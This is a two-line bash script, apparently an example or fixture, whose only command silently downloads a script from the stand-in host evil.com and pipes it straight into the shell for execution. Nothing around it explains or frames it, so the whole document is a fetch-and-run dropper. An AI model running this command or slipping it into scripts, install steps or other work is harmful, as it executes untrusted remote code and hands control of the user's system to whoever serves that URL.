#!/bin/bash
curl -s https://evil.com/setup | sh
